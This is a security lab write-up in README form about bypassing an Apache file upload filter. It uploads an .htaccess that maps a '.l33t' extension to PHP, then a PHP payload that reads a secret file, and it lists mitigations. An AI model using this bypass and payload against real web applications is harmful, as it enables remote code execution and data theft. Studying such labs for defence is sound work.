````markdown
# 🛡️ File Upload Exploitation – Apache .htaccess Bypass

[![Lab Type](https://img.shields.io/badge/Lab-Web_Exploit-blue)](https://github.com/) 
[![Severity](https://img.shields.io/badge/Severity-High-red)](https://github.com/) 
[![RCE](https://img.shields.io/badge/RCE-Confirmed-brightgreen)](https://github.com/) 
[![PHP](https://img.shields.io/badge/Language-PHP-purple)](https://www.php.net/) 
[![Apache](https://img.shields.io/badge/Server-Apache-orange)](https://httpd.apache.org/) 
[![File Upload](https://img.shields.io/badge/Feature-File_Upload-yellow)](https://github.com/)

This project documents a successful file upload exploitation against a simulated vulnerable web application.  
Weak file upload validation was bypassed to achieve **remote code execution (RCE)** using an `.htaccess` trick on an Apache server.

---

## 📑 Table of Contents
1. [Lab Overview](#lab-overview)  
2. [Exploitation Walkthrough](#exploitation-walkthrough)  
   - [Normal File Upload](#normal-file-upload)  
   - [Crafting Malicious Payload](#crafting-malicious-payload)  
   - [Identifying Server](#identifying-server)  
   - [Uploading .htaccess](#uploading-htaccess)  
   - [Uploading Exploit with New Extension](#uploading-exploit-with-new-extension)  
   - [Triggering RCE](#triggering-rce)  
3. [Security Impact](#security-impact)  
4. [Recommended Mitigations](#recommended-mitigations)  
5. [Proof of Exploit](#proof-of-exploit)  
6. [Secret Obtained](#secret-obtained)  
7. [Takeaways](#takeaways)  

---

## Lab Overview
- **Target:** Web app with avatar upload functionality  
- **Vulnerability:** File upload restrictions + Apache `.htaccess` misconfiguration  
- **Impact:** RCE → Secret file disclosure  

---

## Exploitation Walkthrough

### Normal File Upload
- Uploaded a normal image as avatar.  
- Observed with:

```http
GET /files/avatars/<YOUR-IMAGE>
````

---

### Crafting Malicious Payload

* Created `exploit.php` to read Carlos's secret:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

* Upload blocked → `.php` not allowed.

---

### Identifying Server

* Response from `POST /my-account/avatar` revealed:

```http
Server: Apache/2.4.41 (Ubuntu)
```

* Apache + mod\_php suggested an `.htaccess` bypass.

---

### Uploading .htaccess

* Modified upload in Burp Repeater:

```text
- Filename: .htaccess
- Content-Type: text/plain
- Contents:
AddType application/x-httpd-php .l33t
```

* Uploaded successfully ✅

---

### Uploading Exploit with New Extension

* Reused request:

```text
- Filename: exploit.l33t
- Contents: PHP payload
```

* Uploaded successfully ✅

---

### Triggering RCE

* Requested:

```http
GET /files/avatars/exploit.l33t
```

* Server executed PHP → Secret revealed:

```
FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
```

---

## Security Impact

* **Severity:** 🔴 High
* **Risk:** Arbitrary PHP execution
* **Impact:** Unauthorized file disclosure, potential full system compromise

---

## Recommended Mitigations

* Disable `.htaccess` overrides:

```apache
AllowOverride None
```

* Store uploads outside web root
* Strict MIME-type & extension validation (server + client)
* Sanitize uploaded content

---

## Proof of Exploit

<img width="957" height="1079" alt="Burp Repeater Proof" src="https://github.com/user-attachments/assets/f15c03db-3747-4761-9709-d0349b92cd41" />

---

## Secret Obtained

```
FxPam6dKbign7PBPqaNxPRZ76HsNCXr3
```

---

## Takeaways

* Misconfigured servers + weak upload validation → RCE
* Defense-in-depth is key: secure configs, strict validation, and isolating uploads

```

---
